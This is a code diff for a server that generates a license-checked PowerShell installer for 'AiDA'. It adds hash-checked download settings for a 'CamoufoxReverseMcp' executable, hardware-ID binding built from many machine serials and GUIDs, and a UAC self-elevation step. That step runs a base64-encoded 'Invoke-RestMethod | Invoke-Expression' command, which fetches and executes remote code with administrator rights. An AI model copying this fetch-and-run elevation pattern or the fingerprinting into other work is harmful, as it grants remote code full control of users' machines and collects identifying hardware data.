@@ -20,6 +20,7 @@ const TIMESTAMP_WINDOW_MS = parseInt(process.env.BOOTSTRAP_TIMESTAMP_WINDOW_MS |
 const IP_BIND_ENABLED = (process.env.BOOTSTRAP_TOKEN_BIND_IP || '1') !== '0';
 const MAX_PACKAGE_BYTES = positiveIntEnv('AIDA_BOOTSTRAP_PACKAGE_MAX_BYTES', 512 * 1024 * 1024);
 const MAX_CAMOUFOX_SIDECAR_BYTES = positiveIntEnv('AIDA_CAMOUFOX_SIDECAR_MAX_BYTES', 1024 * 1024 * 1024);
+const MAX_CAMOUFOX_MCP_BYTES = positiveIntEnv('AIDA_CAMOUFOX_MCP_MAX_BYTES', 256 * 1024 * 1024);
 const EAUTH_BODY = JSON.stringify({ ok: false, error_code: 'EAUTH' });
 const EAUTH_LENGTH = Buffer.byteLength(EAUTH_BODY, 'utf8');
 const ENCRYPTED_PACKAGE_FORMAT = 'encrypted-cbc-hmac-v1';
@@ -128,6 +129,7 @@ function manifestMacInput(payload) {
     const pkg = artifact.package || {};
     const auth = artifact.authenticode || {};
     const camoufox = payload && payload.camoufox ? payload.camoufox : {};
+    const camoufoxMcp = camoufox.mcp || {};
     const policy = payload && payload.policy ? payload.policy : {};
     return [
         'AIDABOOTMANIFEST.v1',
@@ -154,6 +156,12 @@ function manifestMacInput(payload) {
         camoufox.size || '',
         camoufox.executable_rel || '',
         camoufox.python_rel || '',
+        camoufoxMcp.configured === true ? '1' : '0',
+        camoufoxMcp.version || '',
+        camoufoxMcp.url || '',
+        camoufoxMcp.sha256 || '',
+        camoufoxMcp.size || '',
+        camoufoxMcp.rel || '',
         policy.one_time_token === true ? '1' : '0',
         policy.token_bound_to_client_nonce === true ? '1' : '0',
         policy.token_bound_to_source_ip === true ? '1' : '0',
@@ -161,6 +169,7 @@ function manifestMacInput(payload) {
         policy.no_public_binary_route === true ? '1' : '0',
         policy.encrypted_public_artifact === true ? '1' : '0',
         policy.camoufox_sidecar_hash_required === true ? '1' : '0',
+        policy.camoufox_mcp_hash_required === true ? '1' : '0',
     ].map(v => String(v === undefined || v === null ? '' : v)).join('\n');
 }
 
@@ -179,6 +188,17 @@ function parseToken(token) {
 
 function isHexNonce(value) {
     return typeof value === 'string' && /^[0-9a-f]{64}$/i.test(value);
+}
+
+function normalizeBootstrapHwid(value) {
+    const raw = typeof value === 'string' ? value.trim().toLowerCase() : '';
+    return /^[0-9a-f]{64}$/.test(raw) ? raw : '';
+}
+
+function storedHwidMismatch(storedValue, presentedValue) {
+    const stored = typeof storedValue === 'string' ? storedValue.trim().toLowerCase() : '';
+    if (!stored) return false;
+    return stored !== presentedValue;
 }
 
 function isTimestampFresh(value) {
@@ -324,6 +344,10 @@ function getCamoufoxSidecarConfig() {
     if (!version || !executableRel || (pythonRelRaw && !pythonRel)) {
         return { ok: false, reason: 'camoufox_sidecar_metadata_invalid' };
     }
+    const mcpPatch = getCamoufoxMcpPatchConfig();
+    if (!mcpPatch.ok) {
+        return mcpPatch;
+    }
     return {
         ok: true,
         configured: true,
@@ -333,6 +357,58 @@ function getCamoufoxSidecarConfig() {
         size: Math.floor(size),
         executable_rel: executableRel,
         python_rel: pythonRel,
+        mcp: mcpPatch.configured ? {
+            configured: true,
+            version: mcpPatch.version,
+            url: mcpPatch.url,
+            sha256: mcpPatch.sha256,
+            size: mcpPatch.size,
+            rel: mcpPatch.rel,
+        } : { configured: false },
+    };
+}
+
+function getCamoufoxMcpPatchConfig() {
+    const urlRaw = String(process.env.AIDA_CAMOUFOX_MCP_URL || '').trim();
+    if (!urlRaw) {
+        return { ok: true, configured: false };
+    }
+    const sha256 = String(process.env.AIDA_CAMOUFOX_MCP_SHA256 || '').trim().toLowerCase();
+    const version = String(process.env.AIDA_CAMOUFOX_MCP_VERSION || 'current').trim();
+    const size = Number(process.env.AIDA_CAMOUFOX_MCP_SIZE || 0);
+    const rel = safeSidecarRelativePath(process.env.AIDA_CAMOUFOX_MCP_REL || 'deps\\AiDA_CamoufoxReverseMcp.exe');
+    let parsed;
+    try {
+        parsed = new URL(urlRaw);
+    } catch (_) {
+        return { ok: false, reason: 'camoufox_mcp_url_invalid' };
+    }
+    if (parsed.protocol !== 'https:' && !(process.env.AIDA_CAMOUFOX_SIDECAR_ALLOW_HTTP === '1' && parsed.hostname === 'localhost')) {
+        return { ok: false, reason: 'camoufox_mcp_url_not_https' };
+    }
+    if (/\/api\//i.test(parsed.pathname)) {
+        return { ok: false, reason: 'camoufox_mcp_api_route_disallowed' };
+    }
+    if (!/\.exe$/i.test(parsed.pathname)) {
+        return { ok: false, reason: 'camoufox_mcp_extension_invalid' };
+    }
+    if (!validHexSha256(sha256)) {
+        return { ok: false, reason: 'camoufox_mcp_sha256_invalid' };
+    }
+    if (!Number.isFinite(size) || size <= 0 || size > MAX_CAMOUFOX_MCP_BYTES) {
+        return { ok: false, reason: 'camoufox_mcp_size_invalid' };
+    }
+    if (!version || !rel) {
+        return { ok: false, reason: 'camoufox_mcp_metadata_invalid' };
+    }
+    return {
+        ok: true,
+        configured: true,
+        version,
+        url: parsed.toString(),
+        sha256,
+        size: Math.floor(size),
+        rel,
     };
 }
 
@@ -502,11 +578,12 @@ async function authorizeRequest(body, clientIp, userAgent) {
     const licenseKeyRaw = body && typeof body.license_key === 'string' ? body.license_key.trim() : '';
     const normalizedLicenseKey = keyFormat.normalizeForLookup(licenseKeyRaw);
     const clientNonce = body && typeof body.client_nonce === 'string' ? body.client_nonce.trim().toLowerCase() : '';
+    const presentedHwid = normalizeBootstrapHwid(body && body.hwid);
     if (!release.ok) {
         await audit('bootstrap.authorize', normalizedLicenseKey || '', clientIp, userAgent, 'deny', release.reason, {});
         return { eauth: true };
     }
-    if (!normalizedLicenseKey || licenseKeyRaw.length > 128 || !isHexNonce(clientNonce) || !isTimestampFresh(body.timestamp)) {
+    if (!normalizedLicenseKey || licenseKeyRaw.length > 128 || !isHexNonce(clientNonce) || !presentedHwid || !isTimestampFresh(body.timestamp)) {
         await audit('bootstrap.authorize', normalizedLicenseKey || '', clientIp, userAgent, 'deny', 'invalid_request', {});
         return { eauth: true };
     }
@@ -522,6 +599,13 @@ async function authorizeRequest(body, clientIp, userAgent) {
     const lookup = await lookupActiveLicense(normalizedLicenseKey);
     if (!lookup.ok) {
         await audit('bootstrap.authorize', normalizedLicenseKey, clientIp, userAgent, 'deny', 'license:' + (lookup.reason || 'invalid'), {});
+        return { eauth: true };
+    }
+    if (storedHwidMismatch(lookup.row && lookup.row.hwid, presentedHwid)) {
+        await audit('bootstrap.authorize', lookup.normalized, clientIp, userAgent, 'deny', 'hwid_mismatch', {
+            bound_hwid_present: true,
+            presented_hwid_valid: true,
+        });
         return { eauth: true };
     }
     const issuedAt = nowSec();
@@ -644,6 +728,14 @@ async function manifestRequest(body, clientIp, userAgent) {
             size: release.camoufox.size || '',
             executable_rel: release.camoufox.executable_rel || '',
             python_rel: release.camoufox.python_rel || '',
+            mcp: release.camoufox.mcp && release.camoufox.mcp.configured ? {
+                configured: true,
+                version: release.camoufox.mcp.version || '',
+                url: release.camoufox.mcp.url || '',
+                sha256: release.camoufox.mcp.sha256 || '',
+                size: release.camoufox.mcp.size || '',
+                rel: release.camoufox.mcp.rel || '',
+            } : { configured: false },
         },
         z3: {
             configured: release.z3.configured === true,
@@ -661,6 +753,7 @@ async function manifestRequest(body, clientIp, userAgent) {
             no_public_binary_route: true,
             encrypted_public_artifact: !!release.package,
             camoufox_sidecar_hash_required: release.camoufox.configured === true,
+            camoufox_mcp_hash_required: !!(release.camoufox.mcp && release.camoufox.mcp.configured),
             z3_sidecar_hash_required: release.z3.configured === true,
         },
     };
@@ -695,12 +788,16 @@ function buildBootstrapScript() {
     } catch (_) { }
     const lines = [
         '$ErrorActionPreference = "Stop"',
+        '$AidaBootstrapSelfUrl = ' + psQuote(origin),
         '$AidaBootstrapLogPath = Join-Path ([IO.Path]::GetTempPath()) "aida_bootstrap.log"',
         'function Write-AidaBootstrapLog([string]$Message) { try { $line = "[{0:O}] pid={1} tid={2} {3}{4}" -f [DateTimeOffset]::UtcNow, $PID, [System.Threading.Thread]::CurrentThread.ManagedThreadId, $Message, [Environment]::NewLine; [IO.File]::AppendAllText($script:AidaBootstrapLogPath, $line, [Text.Encoding]::UTF8) } catch { } }',
         'try { $logDir = [IO.Path]::GetDirectoryName($AidaBootstrapLogPath); if ($logDir -and -not [IO.Directory]::Exists($logDir)) { [IO.Directory]::CreateDirectory($logDir) | Out-Null }; [IO.File]::WriteAllText($AidaBootstrapLogPath, ("AiDA bootstrap log started {0:O} pid={1} powershell={2}{3}" -f [DateTimeOffset]::UtcNow, $PID, $PSVersionTable.PSVersion.ToString(), [Environment]::NewLine), [Text.Encoding]::UTF8) } catch { }',
         '$script:AidaBootstrapStartUtc = [DateTimeOffset]::UtcNow',
         'try { Write-AidaBootstrapLog ("script_entry exe=" + [Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) } catch { Write-AidaBootstrapLog "script_entry" }',
         'Write-AidaBootstrapLog "direct_log_ready"',
+        'function Test-AidaIsAdministrator { try { return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { return $false } }',
+        'function Invoke-AidaElevatedBootstrap { $ps = Join-Path $env:SystemRoot "System32\\WindowsPowerShell\\v1.0\\powershell.exe"; if (-not [IO.File]::Exists($ps)) { $ps = "powershell.exe" }; $cmd = "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }; Invoke-RestMethod -Uri `"$AidaBootstrapSelfUrl`" | Invoke-Expression"; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); try { Start-Process -FilePath $ps -Verb RunAs -WindowStyle Normal -ArgumentList @("-NoLogo","-NoProfile","-NoExit","-EncodedCommand",$encoded) | Out-Null; Write-AidaBootstrapLog "elevation_requested"; Write-Host "AiDA requested an elevated PowerShell window through UAC. Continue in the administrator window." -ForegroundColor Cyan; $global:LASTEXITCODE = 0 } catch { Write-AidaBootstrapLog ("elevation_failed " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); Write-Host ("AiDA bootstrap requires administrator approval: " + $_.Exception.Message) -ForegroundColor Red; try { Read-Host "Press Enter to close" | Out-Null } catch { }; $global:LASTEXITCODE = 1 } }',
+        'if (-not (Test-AidaIsAdministrator)) { Invoke-AidaElevatedBootstrap; return }',
         'if ($PSVersionTable.PSEdition -and $PSVersionTable.PSEdition -ne "Desktop") { Write-AidaBootstrapLog ("unsupported_powershell_edition=" + $PSVersionTable.PSEdition); throw "AiDA bootstrap requires Windows PowerShell 5.1. Run it from powershell.exe, not pwsh." }',
         'if ($PSVersionTable.PSVersion.Major -lt 5) { Write-AidaBootstrapLog ("unsupported_powershell_version=" + $PSVersionTable.PSVersion.ToString()); throw "AiDA bootstrap requires Windows PowerShell 5.1 or newer." }',
         '$ProgressPreference = "Continue"',
@@ -722,15 +819,33 @@ function buildBootstrapScript() {
         'function Test-AidaBytesEqual([byte[]]$A, [byte[]]$B) { if ($null -eq $A -or $null -eq $B -or $A.Length -ne $B.Length) { return $false }; $d = 0; for ($i = 0; $i -lt $A.Length; $i++) { $d = $d -bor ($A[$i] -bxor $B[$i]) }; return $d -eq 0 }',
         'function Test-AidaHexEqual([string]$A, [string]$B) { try { $ab = ConvertFrom-AidaHex $A; $bb = ConvertFrom-AidaHex $B; Test-AidaBytesEqual $ab $bb } catch { $false } }',
         'function New-AidaNonce { $b = New-Object byte[] 32; $rng = [Security.Cryptography.RandomNumberGenerator]::Create(); try { $rng.GetBytes($b); ConvertTo-AidaHex $b } finally { $rng.Dispose() } }',
+        'function Get-AidaUtf8Bytes([string]$Text) { if ($null -eq $Text) { $Text = "" }; [Text.Encoding]::UTF8.GetBytes($Text) }',
+        'function Normalize-AidaWhitespace([string]$Text) { if ($null -eq $Text) { return "" }; return ($Text.Trim() -replace "\\s+", " ") }',
+        'function Normalize-AidaUpperWhitespace([string]$Text) { $v = Normalize-AidaWhitespace $Text; if (-not $v) { return "" }; return $v.ToUpperInvariant() }',
+        'function Normalize-AidaSerial([string]$Text) { if ($null -eq $Text) { return "" }; $v = $Text.Trim(); if (-not $v) { return "" }; return $v.ToUpperInvariant() }',
+        'function Normalize-AidaMac([string]$Text) { if ($null -eq $Text) { return "" }; $v = (($Text.ToString()) -replace "[^0-9A-Fa-f]", "").ToUpperInvariant(); if ($v.Length -lt 12) { return "" }; $v = $v.Substring(0, 12); if ($v -match "^(0{12}|F{12})$") { return "" }; return $v }',
+        'function Get-AidaRegistryString([string]$SubKey,[string]$Name) { $base = $null; $key = $null; try { $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, [Microsoft.Win32.RegistryView]::Registry64); $key = $base.OpenSubKey($SubKey); if (-not $key) { return "" }; $v = $key.GetValue($Name, ""); if ($null -eq $v) { return "" }; return [string]$v } catch { return "" } finally { if ($key) { $key.Dispose() }; if ($base) { $base.Dispose() } } }',
+        'function Get-AidaCimItems([string]$Class,[string]$Filter) { try { if ($Filter) { return @(Get-CimInstance -ClassName $Class -Filter $Filter -ErrorAction Stop) }; return @(Get-CimInstance -ClassName $Class -ErrorAction Stop) } catch { try { if ($Filter) { return @(Get-WmiObject -Class $Class -Filter $Filter -ErrorAction Stop) }; return @(Get-WmiObject -Class $Class -ErrorAction Stop) } catch { return @() } } }',
+        'function Get-AidaFirstCimValue([string]$Class,[string]$Property,[string]$Filter) { foreach ($item in (Get-AidaCimItems $Class $Filter)) { try { $v = $item.$Property; if ($null -ne $v) { $s = [string]$v; if ($s.Trim()) { return $s } } } catch { } }; return "" }',
+        'function Get-AidaSmbiosUuidFactor { $u = (Get-AidaFirstCimValue "Win32_ComputerSystemProduct" "UUID" "").Trim(); if ($u -notmatch "^[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}$") { return "" }; $h = $u -replace "-", ""; if ($h -match "^(0{32}|F{32}|f{32})$") { return "" }; return $u.ToLowerInvariant() }',
+        'function Get-AidaBaseboardSerialFactor { Normalize-AidaSerial (Get-AidaFirstCimValue "Win32_BaseBoard" "SerialNumber" "") }',
+        'function Get-AidaChassisSerialFactor { $v = Get-AidaFirstCimValue "Win32_SystemEnclosure" "SerialNumber" ""; Normalize-AidaSerial $v }',
+        'function Get-AidaDiskSerialFactor { $items = Get-AidaCimItems "Win32_DiskDrive" ""; $disk = $items | Where-Object { try { [int]$_.Index -eq 0 } catch { $false } } | Select-Object -First 1; if (-not $disk) { $disk = $items | Select-Object -First 1 }; if (-not $disk) { return "" }; Normalize-AidaSerial ([string]$disk.SerialNumber) }',
+        'function Get-AidaMacFactor { $candidates = New-Object System.Collections.ArrayList; try { foreach ($a in @(Get-NetAdapter -ErrorAction Stop)) { $desc = [string]$a.InterfaceDescription; if ($desc -match "Loopback|Tunnel") { continue }; $p = Normalize-AidaMac ([string]$a.PermanentAddress); if ($p) { [void]$candidates.Add([pscustomobject]@{ value = $p; permanent = $true }) }; $m = Normalize-AidaMac ([string]$a.MacAddress); if ($m) { [void]$candidates.Add([pscustomobject]@{ value = $m; permanent = $false }) } } } catch { }; if ($candidates.Count -eq 0) { foreach ($a in (Get-AidaCimItems "Win32_NetworkAdapter" "MACAddress IS NOT NULL")) { $kind = [string]$a.AdapterType; if ($kind -match "Loopback|Tunnel") { continue }; $m = Normalize-AidaMac ([string]$a.MACAddress); if ($m) { [void]$candidates.Add([pscustomobject]@{ value = $m; permanent = $false }) } } }; if ($candidates.Count -eq 0) { return "" }; $selected = $candidates | Sort-Object -Property @{ Expression = { if ($_.permanent) { 0 } else { 1 } } }, value -Unique | Select-Object -First 1; return [string]$selected.value }',
+        'function Get-AidaCpuBrandFactor { Normalize-AidaUpperWhitespace (Get-AidaFirstCimValue "Win32_Processor" "Name" "") }',
+        'function Get-AidaMachineGuidFactor { $v = Normalize-AidaWhitespace (Get-AidaRegistryString "SOFTWARE\\Microsoft\\Cryptography" "MachineGuid"); if (-not $v) { return "" }; return $v.ToLowerInvariant() }',
+        'function Get-AidaInstallationGuidFactor { $v = Get-AidaRegistryString "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" "InstallationGUID"; if (-not $v) { $v = Get-AidaRegistryString "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" "InstallationID" }; if (-not $v) { $v = Get-AidaRegistryString "SOFTWARE\\Microsoft\\Windows\\CurrentVersion" "InstallationID" }; $v = Normalize-AidaWhitespace $v; if (-not $v) { return "" }; return $v.ToLowerInvariant() }',
+        'function Add-AidaHwidBytes([System.Collections.Generic.List[byte]]$Buffer,[byte[]]$Bytes) { if ($null -eq $Bytes) { $Bytes = New-Object byte[] 0 }; $len = [Math]::Min([int]$Bytes.Length, 65535); $Buffer.Add([byte]($len -band 255)); $Buffer.Add([byte](($len -shr 8) -band 255)); for ($i = 0; $i -lt $len; $i++) { $Buffer.Add($Bytes[$i]) } }',
+        'function Get-AidaBootstrapHwid { $factors = @((Get-AidaSmbiosUuidFactor), (Get-AidaBaseboardSerialFactor), (Get-AidaChassisSerialFactor), (Get-AidaDiskSerialFactor), (Get-AidaMacFactor), (Get-AidaCpuBrandFactor), (Get-AidaMachineGuidFactor), (Get-AidaInstallationGuidFactor), "no_tpm"); $collected = 0; foreach ($f in $factors) { if ($f) { $collected++ } }; if ($collected -lt 5) { throw "AiDA bootstrap HWID collection failed." }; $buf = New-Object "System.Collections.Generic.List[byte]"; $buf.AddRange([byte[]](2,0,0,0)); foreach ($f in $factors) { Add-AidaHwidBytes $buf (Get-AidaUtf8Bytes ([string]$f)) }; $sha = [Security.Cryptography.SHA256]::Create(); try { $bytes = $buf.ToArray(); $hwid = ConvertTo-AidaHex ($sha.ComputeHash($bytes)); if (-not $hwid -or $hwid -notmatch "^[0-9a-f]{64}$") { throw "AiDA bootstrap HWID hash is invalid." }; return $hwid } finally { if ($sha) { $sha.Dispose() }; if ($bytes) { [Array]::Clear($bytes, 0, $bytes.Length) } } }',
         'function Get-AidaSecureText([string]$Prompt) { $s = Read-Host $Prompt -AsSecureString; $p = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($s); try { [Runtime.InteropServices.Marshal]::PtrToStringBSTR($p) } finally { if ($p -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($p) } } }',
         'function Get-AidaTlsHashes([string]$Target) { $u = [Uri]$Target; $tcp = New-Object Net.Sockets.TcpClient; $tcp.Connect($u.Host, $(if ($u.Port -gt 0) { $u.Port } else { 443 })); try { $ssl = New-Object Net.Security.SslStream($tcp.GetStream(), $false, { param($sender,$cert,$chain,$errors) return ($errors -eq [Net.Security.SslPolicyErrors]::None) }); $ssl.AuthenticateAsClient($u.Host); $cert2 = New-Object Security.Cryptography.X509Certificates.X509Certificate2($ssl.RemoteCertificate); $sha = [Security.Cryptography.SHA256]::Create(); try { $certHash = ConvertTo-AidaHex ($sha.ComputeHash($cert2.RawData)); $spkiHash = ""; try { $rsa = [Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPublicKey($cert2); if ($rsa -and $rsa.GetType().GetMethod("ExportSubjectPublicKeyInfo")) { $spkiHash = ConvertTo-AidaHex ($sha.ComputeHash($rsa.ExportSubjectPublicKeyInfo())) } } catch { } try { if (-not $spkiHash) { $ecdsa = [Security.Cryptography.X509Certificates.ECDsaCertificateExtensions]::GetECDsaPublicKey($cert2); if ($ecdsa -and $ecdsa.GetType().GetMethod("ExportSubjectPublicKeyInfo")) { $spkiHash = ConvertTo-AidaHex ($sha.ComputeHash($ecdsa.ExportSubjectPublicKeyInfo())) } } } catch { } if(-not $spkiHash){try{$pk=$cert2.PublicKey;$od=$pk.Oid.Value;$ob=if($od-eq"1.2.840.10045.2.1"){[byte[]]@(6,7,42,134,72,206,61,2,1)}elseif($od-eq"1.2.840.113549.1.1.1"){[byte[]]@(6,9,42,134,72,134,247,13,1,1,1)}else{$null};if($ob){$dl={param($n)if($n-lt128){[byte[]]@($n)}elseif($n-le255){[byte[]]@(129,$n)}else{[byte[]]@(130,($n-shr8),($n-band255))}};$ap=[byte[]]$pk.EncodedParameters.RawData;$kb=[byte[]]$pk.EncodedKeyValue.RawData;$ai=$ob+$ap;$as=[byte[]]@(48)+(& $dl $ai.Length)+$ai;$bs=[byte[]]@(3)+(& $dl (1+$kb.Length))+[byte[]]@(0)+$kb;$si=[byte[]]($as+$bs);$sb=[byte[]]@(48)+(& $dl $si.Length)+$si;$spkiHash=ConvertTo-AidaHex($sha.ComputeHash($sb))}}catch{}} [pscustomobject]@{ cert_sha256 = $certHash; spki_sha256 = $spkiHash } } finally { $sha.Dispose(); $cert2.Dispose(); $ssl.Dispose() } } finally { $tcp.Dispose() } }',
         'function Assert-AidaTlsPin { if (-not $AidaPinnedSpkiSha256 -and -not $AidaPinnedCertSha256) { if ($AidaRequireTlsPin) { throw "AiDA bootstrap TLS pin is not configured." }; return }; $h = Get-AidaTlsHashes $AidaBootstrapServer; if ($AidaPinnedSpkiSha256 -and $h.spki_sha256 -and ($h.spki_sha256.ToLowerInvariant() -eq $AidaPinnedSpkiSha256.ToLowerInvariant())) { return }; if ($AidaPinnedCertSha256 -and ($h.cert_sha256.ToLowerInvariant() -eq $AidaPinnedCertSha256.ToLowerInvariant())) { return }; throw "AiDA bootstrap TLS pin verification failed." }',
         'function Enable-AidaPinnedTls { $script:AidaPinnedHost = ([Uri]$AidaBootstrapServer).Host; [Net.ServicePointManager]::ServerCertificateValidationCallback = { param($sender,$cert,$chain,$errors) try { if ($errors -ne [Net.Security.SslPolicyErrors]::None) { return $false }; $cert2 = New-Object Security.Cryptography.X509Certificates.X509Certificate2($cert); $sha = [Security.Cryptography.SHA256]::Create(); try { $certHash = ConvertTo-AidaHex ($sha.ComputeHash($cert2.RawData)); if ($AidaPinnedCertSha256 -and ($certHash.ToLowerInvariant() -eq $AidaPinnedCertSha256.ToLowerInvariant())) { return $true }; if ($AidaPinnedSpkiSha256) { $spkiHash = ""; try { $rsa = [Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPublicKey($cert2); if ($rsa -and $rsa.GetType().GetMethod("ExportSubjectPublicKeyInfo")) { $spkiHash = ConvertTo-AidaHex ($sha.ComputeHash($rsa.ExportSubjectPublicKeyInfo())) } } catch { }; try { if (-not $spkiHash) { $ecdsa = [Security.Cryptography.X509Certificates.ECDsaCertificateExtensions]::GetECDsaPublicKey($cert2); if ($ecdsa -and $ecdsa.GetType().GetMethod("ExportSubjectPublicKeyInfo")) { $spkiHash = ConvertTo-AidaHex ($sha.ComputeHash($ecdsa.ExportSubjectPublicKeyInfo())) } } } catch { }; if(-not $spkiHash){try{$pk=$cert2.PublicKey;$od=$pk.Oid.Value;$ob=if($od-eq"1.2.840.10045.2.1"){[byte[]]@(6,7,42,134,72,206,61,2,1)}elseif($od-eq"1.2.840.113549.1.1.1"){[byte[]]@(6,9,42,134,72,134,247,13,1,1,1)}else{$null};if($ob){$dl={param($n)if($n-lt128){[byte[]]@($n)}elseif($n-le255){[byte[]]@(129,$n)}else{[byte[]]@(130,($n-shr8),($n-band255))}};$ap=[byte[]]$pk.EncodedParameters.RawData;$kb=[byte[]]$pk.EncodedKeyValue.RawData;$ai=$ob+$ap;$as=[byte[]]@(48)+(& $dl $ai.Length)+$ai;$bs=[byte[]]@(3)+(& $dl (1+$kb.Length))+[byte[]]@(0)+$kb;$si=[byte[]]($as+$bs);$sb=[byte[]]@(48)+(& $dl $si.Length)+$si;$spkiHash=ConvertTo-AidaHex($sha.ComputeHash($sb))}}catch{}}; if ($spkiHash -and ($spkiHash.ToLowerInvariant() -eq $AidaPinnedSpkiSha256.ToLowerInvariant())) { return $true } }; return (-not $AidaRequireTlsPin -and -not $AidaPinnedCertSha256 -and -not $AidaPinnedSpkiSha256) } finally { $sha.Dispose(); $cert2.Dispose() } } catch { return $false } } }',
-        'function Invoke-AidaJson([string]$Path, [object]$Body) { $json = $null; $bytes = $null; $req = $null; $resp = $null; try { Write-AidaBootstrapLog ("http_post path=" + $Path); $json = $Body | ConvertTo-Json -Depth 8 -Compress; $bytes = [Text.Encoding]::UTF8.GetBytes($json); $req = [Net.HttpWebRequest]::Create($AidaBootstrapServer + $Path); $req.Method = "POST"; $req.UserAgent = "AiDA Bootstrap"; $req.ContentType = "application/json"; $req.AllowAutoRedirect = $false; $req.Timeout = 120000; $req.ReadWriteTimeout = 120000; $req.ContentLength = $bytes.Length; $rs = $req.GetRequestStream(); try { $rs.Write($bytes, 0, $bytes.Length) } finally { if ($rs) { $rs.Dispose() } }; $resp = $req.GetResponse(); Write-AidaBootstrapLog ("http_response path=" + $Path + " status=" + [int]$resp.StatusCode); if ([int]$resp.StatusCode -ne 200) { throw "AiDA bootstrap API request failed." }; $reader = New-Object IO.StreamReader($resp.GetResponseStream(), [Text.Encoding]::UTF8); try { $text = $reader.ReadToEnd(); $text | ConvertFrom-Json } finally { $reader.Dispose(); $text = $null } } catch { Write-AidaBootstrapLog ("http_error path=" + $Path + " error=" + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); throw } finally { if ($resp) { $resp.Dispose() }; if ($bytes) { [Array]::Clear($bytes, 0, $bytes.Length) }; $json = $null } }',
+        'function Invoke-AidaJson([string]$Path, [object]$Body) { $json = $null; $bytes = $null; $req = $null; $resp = $null; $rs = $null; try { Write-AidaBootstrapLog ("http_post path=" + $Path); $json = $Body | ConvertTo-Json -Depth 8 -Compress; $bytes = [Text.Encoding]::UTF8.GetBytes($json); $req = [Net.HttpWebRequest]::Create($AidaBootstrapServer + $Path); $req.Method = "POST"; $req.UserAgent = "AiDA Bootstrap"; $req.ContentType = "application/json"; $req.AllowAutoRedirect = $false; $req.Timeout = 60000; $req.ReadWriteTimeout = 60000; $req.ContentLength = $bytes.Length; $rs = $req.GetRequestStream(); try { $rs.Write($bytes, 0, $bytes.Length) } finally { if ($rs) { $rs.Dispose(); $rs = $null } }; try { $resp = $req.GetResponse() } catch [Net.WebException] { $status = 0; $wresp = $_.Exception.Response; try { if ($wresp) { $status = [int]$wresp.StatusCode } } finally { if ($wresp) { $wresp.Dispose() } }; Write-AidaBootstrapLog ("http_response_error path=" + $Path + " status=" + $status); if ($Path -eq "/api/bootstrap/authorize" -and ($status -eq 401 -or $status -eq 403)) { throw "AiDA bootstrap authorization failed. Verify the license key and machine binding." }; throw "AiDA bootstrap API request failed." }; Write-AidaBootstrapLog ("http_response path=" + $Path + " status=" + [int]$resp.StatusCode); if ([int]$resp.StatusCode -ne 200) { throw "AiDA bootstrap API request failed." }; $reader = New-Object IO.StreamReader($resp.GetResponseStream(), [Text.Encoding]::UTF8); try { $text = $reader.ReadToEnd(); $text | ConvertFrom-Json } finally { $reader.Dispose(); $text = $null } } catch { Write-AidaBootstrapLog ("http_error path=" + $Path + " error=" + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); throw } finally { if ($resp) { $resp.Dispose() }; if ($bytes) { [Array]::Clear($bytes, 0, $bytes.Length) }; $json = $null } }',
         'function Get-AidaTokenId([string]$Token) { $m = [regex]::Match($Token, "^AIDABOOT\\.v1\\.([0-9a-fA-F]{32})\\.([0-9a-fA-F]{64})$"); if (-not $m.Success) { throw "AiDA bootstrap token format is invalid." }; $m.Groups[1].Value.ToLowerInvariant() }',
         'function Get-AidaTokenSecretBytes([string]$Token) { $m = [regex]::Match($Token, "^AIDABOOT\\.v1\\.([0-9a-fA-F]{32})\\.([0-9a-fA-F]{64})$"); if (-not $m.Success) { throw "AiDA bootstrap token format is invalid." }; ConvertFrom-AidaHex $m.Groups[2].Value }',
         'function Get-AidaTokenParts([string]$Token) { $m = [regex]::Match($Token, "^AIDABOOT\\.v1\\.([0-9a-fA-F]{32})\\.([0-9a-fA-F]{64})$"); if (-not $m.Success) { throw "AiDA bootstrap token format is invalid." }; [pscustomobject]@{ id = $m.Groups[1].Value.ToLowerInvariant(); secret = $m.Groups[2].Value.ToLowerInvariant() } }',
-        'function Get-AidaManifestMacInput([object]$M) { @("AIDABOOTMANIFEST.v1", [string]$M.token_id, [string]$M.issued_at, [string]$M.expires_at, [string]$M.artifact.name, [string]$M.artifact.version, [string]$M.artifact.url, [string]$M.artifact.sha256, [string]$M.artifact.size, [string]$M.artifact.package.format, [string]$M.artifact.package.sha256, [string]$M.artifact.package.size, [string]$M.artifact.package.enc_key_b64, [string]$M.artifact.package.mac_key_b64, $(if ($M.artifact.authenticode.required) { "1" } else { "0" }), [string]$M.artifact.authenticode.signer_thumbprint, $(if ($M.artifact.authenticode.accept_pinned_private_ca) { "1" } else { "0" }), $(if ($M.camoufox.configured) { "1" } else { "0" }), [string]$M.camoufox.version, [string]$M.camoufox.url, [string]$M.camoufox.sha256, [string]$M.camoufox.size, [string]$M.camoufox.executable_rel, [string]$M.camoufox.python_rel, $(if ($M.policy.one_time_token) { "1" } else { "0" }), $(if ($M.policy.token_bound_to_client_nonce) { "1" } else { "0" }), $(if ($M.policy.token_bound_to_source_ip) { "1" } else { "0" }), $(if ($M.policy.artifact_https_required) { "1" } else { "0" }), $(if ($M.policy.no_public_binary_route) { "1" } else { "0" }), $(if ($M.policy.encrypted_public_artifact) { "1" } else { "0" }), $(if ($M.policy.camoufox_sidecar_hash_required) { "1" } else { "0" })) -join "`n" }',
